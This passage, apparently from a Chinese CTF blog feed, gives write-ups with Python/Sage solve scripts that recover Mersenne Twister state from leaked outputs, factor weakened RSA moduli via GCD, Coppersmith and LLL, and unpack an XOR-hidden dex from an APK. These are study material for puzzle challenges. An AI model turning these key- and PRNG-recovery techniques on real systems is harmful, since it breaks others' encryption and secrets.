class="hljs-string">&#x27;67f4660a8335fb9f4152a9fbc44c9c77&#x27;</span>, <span class="hljs-string">&#x27;8cd43c85ebe9cc7036a37f47ccd1d1e4&#x27;</span>,<br>     <span class="hljs-string">&#x27;ee3e8c62e8b0100027589d6de82677ef&#x27;</span>, <span class="hljs-string">&#x27;463bb2f3731ad0e786302bf78da08330&#x27;</span>, <span class="hljs-string">&#x27;e245b1852a3b92734e46eb3421bd76c9&#x27;</span>,<br>     <span class="hljs-string">&#x27;0b74736786b4ab94651e3b706a548e55&#x27;</span>, <span class="hljs-string">&#x27;79cb596b28c2b4e02738f93b5bfbe0d3&#x27;</span>, <span class="hljs-string">&#x27;5a9c46837952952045564b5b395acad1&#x27;</span>,<br>     <span class="hljs-string">&#x27;d3c2d90a05d1a059fbeba4a05a608798&#x27;</span>, <span class="hljs-string">&#x27;4da0306c8ab58097d2fef9114e6fcb6d&#x27;</span>, <span class="hljs-string">&#x27;9707fabbd3c96de66917f15998ac9201&#x27;</span>,<br>     <span class="hljs-string">&#x27;9dd3e46fc930abfb523fe31e8ee8a658&#x27;</span>, <span class="hljs-string">&#x27;3716a8fd05f7388e7151d09431e61ee1&#x27;</span>, <span class="hljs-string">&#x27;9acf027679a6d7a674a43dee4f5bea35&#x27;</span>,<br>     <span class="hljs-string">&#x27;78702a2b125a940519337b1bf50aff8a&#x27;</span>, <span class="hljs-string">&#x27;262cf3b8c8072a602048a24756c83fcf&#x27;</span>, <span class="hljs-string">&#x27;092f8d227ec583c4734a6f449de521a3&#x27;</span>,<br>     <span class="hljs-string">&#x27;712aa300302b57fed458553426348fce&#x27;</span>, <span class="hljs-string">&#x27;834d4a0ea451cc04b469636b18c56435&#x27;</span>, <span class="hljs-string">&#x27;754b5284b14402c61e3b1e56cb2d41e9&#x27;</span>,<br>     <span class="hljs-string">&#x27;51d742ca6a341032afcb5dc645f54bfa&#x27;</span>, <span class="hljs-string">&#x27;c1a33d104f47e33d6932905b483a2018&#x27;</span>, <span class="hljs-string">&#x27;3def7c2a14cff6b2864a2100956df07f&#x27;</span>,<br>     <span class="hljs-string">&#x27;7e3606e4ec1c99fe5a8593ae44f25a70&#x27;</span>, <span class="hljs-string">&#x27;404c6139570883dbab8e5a299d7a5017&#x27;</span>, <span class="hljs-string">&#x27;f07597079e1b68ebb4e2d16b83b7b484&#x27;</span>,<br>     <span class="hljs-string">&#x27;0723daf5c65f8ba6cd6e43fcdf9d18dc&#x27;</span>, <span class="hljs-string">&#x27;4c54db12829f165837384b66978e8438&#x27;</span>, <span class="hljs-string">&#x27;cd056e64e1f31461cab2e66ece9d3278&#x27;</span>,<br>     <span class="hljs-string">&#x27;2f6ae16fab122cbce240e32464a1ab57&#x27;</span>, <span class="hljs-string">&#x27;f86e0e9ee23498340f62d8617f6f5218&#x27;</span>, <span class="hljs-string">&#x27;af4ebe2535885c783c89f8d8c4815076&#x27;</span>,<br>     <span class="hljs-string">&#x27;c8eae5b5c7aca2c5fdb4f284e2cf65c5&#x27;</span>, <span class="hljs-string">&#x27;bec0d8ecabedd9811a8ecb6052b21d8c&#x27;</span>, <span class="hljs-string">&#x27;731bd3421b6517aa101357fe1c49caf3&#x27;</span>,<br>     <span class="hljs-string">&#x27;344f4a26cdaf1a782d9b32208e1a3e92&#x27;</span>, <span class="hljs-string">&#x27;892b1741d304878461dd0774a335ea3d&#x27;</span>, <span class="hljs-string">&#x27;56e2a484ca40f43e059bf5f0bd822bdc&#x27;</span>,<br>     <span class="hljs-string">&#x27;d7c0762df71b31c14654147fb9a0595c&#x27;</span>, <span class="hljs-string">&#x27;57016a179ba5509f6b04a161ac628b34&#x27;</span>, <span class="hljs-string">&#x27;e49a2d573522c1ee3e8348ceca0295a4&#x27;</span>,<br>     <span class="hljs-string">&#x27;4b0f49c7e6469e82832e9cc90b9e17c0&#x27;</span>, <span class="hljs-string">&#x27;eadc9d0c8b75127fe0a7f71881de1ea7&#x27;</span>, <span class="hljs-string">&#x27;db9fe5537768207bd8cdf770bcd42dfa&#x27;</span>,<br>     <span class="hljs-string">&#x27;ba2f57578752628d1ecac419b3a8bc36&#x27;</span>, <span class="hljs-string">&#x27;3752e70b5d2b578a8d412d84aab43705&#x27;</span>, <span class="hljs-string">&#x27;54e97795df8781c776cbb1ce4f5f31fc&#x27;</span>,<br>     <span class="hljs-string">&#x27;32794880abc9f68102c24e92ad9c7cd5&#x27;</span>,<br>     <span class="hljs-string">&#x27;b5eb7e651ca298f6873694c47d1cd3da&#x27;</span>, <span class="hljs-string">&#x27;a188934777d2c67e3d59692135005497&#x27;</span>, <span class="hljs-string">&#x27;34c308fa1644b387169ea88c1b575490&#x27;</span>]<br>    code=[<span class="hljs-string">&#x27;2eebed894580fb900c3615d4866150e68322ff4d48e7509f85ff4543969b0cf6&#x27;</span>,<br>     <span class="hljs-string">&#x27;017aefd63b4ce14eb376161902d92894a15f680e7b055ce25c3b02c6b49db0a6&#x27;</span>,<br>     <span class="hljs-string">&#x27;e12d945904032887c967ae03a48c8b096abc79dc64134d872693599d4f6c91cc&#x27;</span>,<br>     <span class="hljs-string">&#x27;0f8957f365f53a7209baa852905c5da5dba54ddb403ab17a4c9b3a051540d49c&#x27;</span>,<br>     <span class="hljs-string">&#x27;091e3e41815cd32f482f2cf54ac3338fc918c2a657896af1aa1b23ea528664f4&#x27;</span>,<br>     <span class="hljs-string">&#x27;5916cd18e8c48c545232112f2179aa7a722350a8a0ced4f1363cc61bc9d83630&#x27;</span>,<br>     <span class="hljs-string">&#x27;37702710d47a1c17278743253123f6eac85b16d9393432ec65100143bc8657e8&#x27;</span>,<br>     <span class="hljs-string">&#x27;c3a7006293c48957cba5c010f945483cfdc47650a79d0e8a8a9a52c174244a10&#x27;</span>,<br>     <span class="hljs-string">&#x27;e1a90a475dd21da64d64ea1dd50a82a622061d08e9d4b3016982c4a0b42f1251&#x27;</span>,<br>     <span class="hljs-string">&#x27;2f40ff85024765e58ed175927c53e0a279cda96ce755b602f89bfc171108ba3d&#x27;</span>,<br>     <span class="hljs-string">&#x27;f4f8337dd7267d02638a9cc531c8a02fe0316dd5ff6f8c8aec898c060c6fb217&#x27;</span>,<br>     <span class="hljs-string">&#x27;0df2f3fe1eb976944a2de5729fca4a12b83c8329b4f514869856ebb94b7d7bf9&#x27;</span>,<br>     <span class="hljs-string">&#x27;abb2f1277b1cb5ad07254b7f7ed346bcdb73282b306123ce0b5befe42a9e796d&#x27;</span>,<br>     <span class="hljs-string">&#x27;6ef31ed6a2a465bcd146c2438bf391bfd9f3187cf54afae512220a7a94714bf3&#x27;</span>,<br>     <span class="hljs-string">&#x27;6981f99ba288923a5cd68908ecc8795bf301f1e7d081ac6580a63902fd52da01&#x27;</span>,<br>     <span class="hljs-string">&#x27;b6b07975697de1c0342e3711b59165b849125794ef2541c6c60dcf40e689df7b&#x27;</span>,<br>     <span class="hljs-string">&#x27;20e3af3a2bcedfd15199975cc9edcde14cb13fdff3ea0607a4747601e500aede&#x27;</span>,<br>     <span class="hljs-string">&#x27;606aa1daf188b9dd5fd6141312f1828846f92baa519e70e5c6923a352421fe2f&#x27;</span>,<br>     <span class="hljs-string">&#x27;1dc6a60112e99c5b884c0bb5430a7a54eba8aef34fada9cb96bce79a22456cf2&#x27;</span>,<br>     <span class="hljs-string">&#x27;fd81e36f576119a19185cd12e87544b42f9fcc3dcb5e7ba282b1a128d73d63c5&#x27;</span>,<br>     <span class="hljs-string">&#x27;7a01e947ca012a5c9a8dd20e693a7788cd6157a5c3fce5fa7c7e09014ea3266e&#x27;</span>,<br>     <span class="hljs-string">&#x27;ccd162b182c773062514ffc3551ed47f32293700083782d902efc55b1e9795c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;dbb6115aefd2638eebf44d3be6e9525e09ff036269d954469a0f925b496327a7&#x27;</span>,<br>     <span class="hljs-string">&#x27;ac08696fe64bb5e58cd3e558463213ca08ab7805e33f45459ae14b35fc5858c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;6e1594596ad1c656635af29d14b22a5ed10e545442eea5f4e056e20d11aa33b3&#x27;</span>,<br>     <span class="hljs-string">&#x27;4afd17e64562603c66ce0ca42d544ca48511c3d560f9180c231a9ccb28a0e55e&#x27;</span>,<br>     <span class="hljs-string">&#x27;06b2d2b24ca626e18fdcb3196e989e3b05150500815511f48200ddea9aacda48&#x27;</span>,<br>     <span class="hljs-string">&#x27;947a11e8258fd161d02b0eb1b2e8fcd9ff1684a7c75f7c506ddee91f08316f56&#x27;</span>,<br>     <span class="hljs-string">&#x27;a0e58b15736cab055be1d03860dedb6b8136f6739308c2e0ef6a7490c6b4a1f1&#x27;</span>,<br>     <span class="hljs-string">&#x27;31476f64f96d72a398e7eb789068b8cfd61ed9cac95d76824a2bbf5b682ea72d&#x27;</span>,<br>     <span class="hljs-string">&#x27;974259198846a4849d318afd325d860a6e40dfd39e1ed8c7b6d87c990e35efcf&#x27;</span>,<br>     <span class="hljs-string">&#x27;e93d02ba7079c488c30e377794b4fcc62eeafb6c3f02197f1ebc059e3e5f7f07&#x27;</span>,<br>     <span class="hljs-string">&#x27;ded96eec0d25c05a54671a001bcd99f5c6d3991d2fdf80afb8f0861a44f3fd64&#x27;</span>,<br>     <span class="hljs-string">&#x27;86f34c1da65f07634de7c302a6df306dd545806022411a318900bd33b0aff9bd&#x27;</span>,<br>     <span class="hljs-string">&#x27;59baf4cf3d3b85fcdefd1a9b60c3d78926ff73650ac375c616b30fe9063b377d&#x27;</span>,<br>     <span class="hljs-string">&#x27;02f2ee251ecc19fa52dd42c0e0b609bc2e7a8ae11ce6ca35396a4bc74d12ac63&#x27;</span>,<br>     <span class="hljs-string">&#x27;597d09b4c43012b1b4b040d8c62d5fb02d1c4249de4eea06e1447000ba53f50c&#x27;</span>,<br>     <span class="hljs-string">&#x27;bb87bd8e1903db2df41c349914e9f3591bb032400be6e86ed10e7d292243a374&#x27;</span>,<br>     <span class="hljs-string">&#x27;cec38960069fdc8090cfbdd166e15ec8a77ce5b4d6b350805a63d2b54cbf0187&#x27;</span>,<br>     <span class="hljs-string">&#x27;1439d35a9c0caa9cacabe8e6179a02d51ebb9fb51125d5eeaba47ff6b8abcc97&#x27;</span>,<br>     <span class="hljs-string">&#x27;820d72d49e0fd86ef47b022a3091b326be8b0d2a42f87cbc918737b9972ea62f&#x27;</span>,<br>     <span class="hljs-string">&#x27;e625e82100031fa4a4410700034859cd4b35c086f5ac2870c6909c16a6831bfc&#x27;</span>,<br>     <span class="hljs-string">&#x27;f0e22f5167d29331351e1718c17b5420f6a29d84357273e1bfb24c2ff34fa675&#x27;</span>,<br>     <span class="hljs-string">&#x27;a5a7991f0c5c6a44f68c5c18661611057dbabeff7847623315ce784095645f75&#x27;</span>,<br>     <span class="hljs-string">&#x27;07cd3f5c5c690214af5feda27b3aec257543a8f96bc509805028a0e95c5d98c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;6e5dd4405c1b446b9530e4d9356c05b71d1bfcf8a79778588143c3b6fec3fded&#x27;</span>,<br>     <span class="hljs-string">&#x27;a33f821d277e6f73c09a5ecd14cef80bac29ffe2b917225c27725d2447ac0489&#x27;</span>,<br>     <span class="hljs-string">&#x27;c18a4a02dd1f7ee65bf5596c53549c286a754afb0e3b90b2369cdd1e43c0b986&#x27;</span>,<br>     <span class="hljs-string">&#x27;6b8df66aa27b40ca275bc133958b5d543167edf919e7e623a496c9afbf7594d6&#x27;</span>,<br>     <span class="hljs-string">&#x27;c48124eeef995c7bb705bd240a26dbf6bdbe42ba29addf7ac78fa28dbed3debe&#x27;</span>,<br>     <span class="hljs-string">&#x27;040eef11dc6e0f3bb3e58e12d2a57ee274071a9c6224f27db70e19a8aa7d4df2&#x27;</span>,<br>     <span class="hljs-string">&#x27;4ecd0a955e52657fab8dfdac2df4d805f1d08b031df8bce22ac01fe20ca72c5b&#x27;</span>]<br><br>    data = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)):<br>        t1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">id</span>[i], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data.append(t1 &amp; <span class="hljs-number">0xffffffff</span>)<br>            t1 &gt;&gt;= <span class="hljs-number">32</span><br>        t2 = <span class="hljs-built_in">int</span>(code[i], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            data.append(t2 &amp; <span class="hljs-number">0xffffffff</span>)<br>            t2 &gt;&gt;= <span class="hljs-number">32</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(data))<br>state1=recover_state(data)<br>state0=backtrace([<span class="hljs-number">0</span>]*<span class="hljs-number">12</span>+state1)[:<span class="hljs-number">624</span>]<br>ran=Random()<br>ran.setstate((<span class="hljs-number">3</span>,<span class="hljs-built_in">tuple</span>(state0+[<span class="hljs-number">0</span>]),<span class="hljs-literal">None</span>))<br>id0=ran.getrandbits(<span class="hljs-number">128</span>)<br>code0=ran.getrandbits(<span class="hljs-number">256</span>)<br><span class="hljs-keyword">assert</span> ran.getrandbits(<span class="hljs-number">32</span>)==data[<span class="hljs-number">0</span>]<br>flag=md5((<span class="hljs-built_in">hex</span>(id0)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)+<span class="hljs-built_in">hex</span>(code0)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">64</span>)).encode()).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&#123;%s&#125;&quot;</span>%flag)<br><br><span class="hljs-comment">#flag&#123;22b307a4ac14c89888d5a6c79f7f963c&#125;</span><br></code></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>jadx打开在MainActivity中发现判断逻辑<br><img src="/mdimg/2023hwswinter/1.png"><br>查看check函数<br><img src="/mdimg/2023hwswinter/2.png"><br>因为看到了check函数，根据逻辑去解发现解不出来<br><img src="/mdimg/2023hwswinter/3.png"><br>看到了c这个类中对enc这个文件进行了异或。将apk解压发现assets文件夹下有enc这个文件。按逻辑复原数据。<br><img src="/mdimg/2023hwswinter/4.png"><br>发现这是一个dex文件，接着用jadx打开<br><img src="/mdimg/2023hwswinter/5.png"><br>发现aes加密，网站直接解<br><img src="/mdimg/2023hwswinter/6.png"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="sound-from-somewhere"><a href="#sound-from-somewhere" class="headerlink" title="sound from somewhere"></a>sound from somewhere</h2><p>一眼顶针为SSTV  使用MSSTV转换<br><img src="/mdimg/2023hwswinter/7.bmp"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWNHUB 2022 冬季赛</title>
    <link href="/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/"/>
    <url>/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2022PWNHUB/1671426618514.jpg"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><br>R = getPrime(<span class="hljs-number">256</span>)<br>S = getPrime(<span class="hljs-number">512</span>)<br>A = getPrime(<span class="hljs-number">1024</span>)<br><br>N = R * S * A<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">0x10001</span>, N)<br><br>RA = R &amp; A<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA1&#x27;</span>,<span class="hljs-built_in">hex</span>(RA * S))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA2&#x27;</span>,<span class="hljs-built_in">hex</span>(RA | S))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-built_in">hex</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-built_in">hex</span>(N))<br><br><span class="hljs-comment"># RSA1 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br><span class="hljs-comment"># RSA2 0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br><span class="hljs-comment"># c 0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br><span class="hljs-comment"># N 0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br></code></pre></td></tr></table></figure><p>非预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>S=GCD(RSA1,N)<br>d=inverse(<span class="hljs-number">0x10001</span>,S-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,S)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#flag&#123;b66f68258f184bd7afddd32c1518eed0&#125;</span><br></code></pre></td></tr></table></figure><p>预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>offset = <span class="hljs-number">256</span><br>RSA2 &gt;&gt;= offset<br>RSA2 &lt;&lt;= offset<br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(RSA1))<br>f = x + RSA2<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^offset, beta = <span class="hljs-number">0.4</span>)<br>S = RSA2 + roots[<span class="hljs-number">0</span>]<br>S = <span class="hljs-built_in">int</span>(S)<br><br>cc = <span class="hljs-built_in">int</span>(c % S)<br><span class="hljs-built_in">print</span>(cc)<br>d = <span class="hljs-built_in">int</span>(inverse(<span class="hljs-number">0x10001</span>, S-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(cc,d,S)))<br></code></pre></td></tr></table></figure><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1755716071599</span><br>N = <span class="hljs-number">236038564943567983056828121309828109017</span><br>Px, Py =<br>b = ZZ((Py**<span class="hljs-number">2</span> - Px**<span class="hljs-number">3</span> - a * Px) % N)<br>e = (b&lt;&lt;<span class="hljs-number">42</span>) + a<br><br>enc1 = <span class="hljs-number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span><br>enc2 = <span class="hljs-number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span><br>NN = <span class="hljs-number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span><br>M = matrix(ZZ, [<br>    [<span class="hljs-number">2</span>**<span class="hljs-number">256</span>, enc1, enc2],<br>    [<span class="hljs-number">0</span>, NN, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, NN]<br>])<br>L = M.LLL()<br>hd, ld = L[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], L[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>d = (hd&lt;&lt;<span class="hljs-number">512</span>) + ld<br><br>n = <span class="hljs-number">236038564943567983056828121309828109017</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*d, n) == <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    k = e * d - <span class="hljs-number">1</span><br>    g = randint(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        x = <span class="hljs-built_in">pow</span>(g, k, n)<br>        <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n &gt; GCD(x - <span class="hljs-number">1</span>, n) &gt; <span class="hljs-number">1</span>:<br>            p = GCD(x - <span class="hljs-number">1</span>, n)<br>            q = n // p<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p = &#125;</span>\n<span class="hljs-subst">&#123;q = &#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(p * q == n)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                <span class="hljs-built_in">print</span>(long_to_bytes(p &gt;&gt; i))<br>                <span class="hljs-built_in">print</span>(long_to_bytes(q &gt;&gt; i))<br>            exit()<br>        <span class="hljs-keyword">if</span> k % <span class="hljs-number">2</span>:<span class="hljs-keyword">break</span><br>        k //= <span class="hljs-number">2</span><br><span class="hljs-comment"># flag&#123;e89f47939d12434cb201080d8b240774&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="飞驰人生"><a 